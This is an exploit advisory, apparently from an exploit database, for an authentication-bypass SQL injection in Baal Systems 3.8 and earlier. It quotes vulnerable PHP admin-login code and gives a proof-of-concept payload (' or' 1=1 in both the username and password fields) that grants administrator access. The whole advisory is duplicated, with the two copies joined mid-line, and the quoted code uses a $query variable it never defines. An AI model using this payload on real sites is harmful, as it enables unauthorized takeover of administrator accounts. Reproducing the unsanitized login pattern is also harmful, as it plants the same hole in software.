Baal Systems <= 3.8 (Auth Bypass) SQL Injection Vulnerability
=============================================================

[+] Baal Systems <= 3.8 (Auth Bypass) SQL Injection Vulnerability
[+] Discovered by cr4wl3r 
 
[+] Vuln Code :
 
[adminlogin.php]
 
<?php
include("common.php");
if (!empty($_POST[&#039;password&#039;])) {
    $username = $_POST[&#039;username&#039;];
    $password = $_POST[&#039;password&#039;];
 
    $result1 = db_query($query);
    $rows = db_num_rows($result1);
    $row = db_fetch_array($result1);
    if ($rows != 0) {
        if (session_is_registered("whossession")) {
            $_SESSION[&#039;who&#039;] = "admin";
            $_SESSION[&#039;userrole&#039;] = "admin";
            $_SESSION[&#039;username&#039;] = $username;
            $_SESSION[&#039;usernum&#039;] = $row["userid"];
            header("location:admin.php");
        } else {
            session_register("whossession");
            $_SESSION[&#039;who&#039;] = "admin";
            $_SESSION[&#039;userrole&#039;] = "admin";
            $_SESSION[&#039;username&#039;] = $username;
            $_SESSION[&#039;usernum&#039;] = $row["userid"];
            header("location:admin.php");
        }
    } else {
        header("location:adminlogin.php?error=yes");
    }
} else {
 
    ?>
 
[+] PoC :
 
[BaalSystems_path]/adminlogin.php
 
 
username: &#039; or&#039; 1=1
Password: &#039; or&#039; 1=1[+] Baal Systems <= 3.8 (Auth Bypass) SQL Injection Vulnerability
[+] Discovered by cr4wl3r <cr4wl3r[!]linuxmail.org>
 
[+] Vuln Code :
 
[adminlogin.php]
 
<?php
include("common.php");
if (!empty($_POST[&#039;password&#039;])) {
    $username = $_POST[&#039;username&#039;];
    $password = $_POST[&#039;password&#039;];
 
    $result1 = db_query($query);
    $rows = db_num_rows($result1);
    $row = db_fetch_array($result1);
    if ($rows != 0) {
        if (session_is_registered("whossession")) {
            $_SESSION[&#039;who&#039;] = "admin";
            $_SESSION[&#039;userrole&#039;] = "admin";
            $_SESSION[&#039;username&#039;] = $username;
            $_SESSION[&#039;usernum&#039;] = $row["userid"];
            header("location:admin.php");
        } else {
            session_register("whossession");
            $_SESSION[&#039;who&#039;] = "admin";
            $_SESSION[&#039;userrole&#039;] = "admin";
            $_SESSION[&#039;username&#039;] = $username;
            $_SESSION[&#039;usernum&#039;] = $row["userid"];
            header("location:admin.php");
        }
    } else {
        header("location:adminlogin.php?error=yes");
    }
} else {
 
    ?>
 
[+] PoC :
 
[BaalSystems_path]/adminlogin.php
 
 
username: &#039; or&#039; 1=1
Password: &#039; or&#039; 1=1


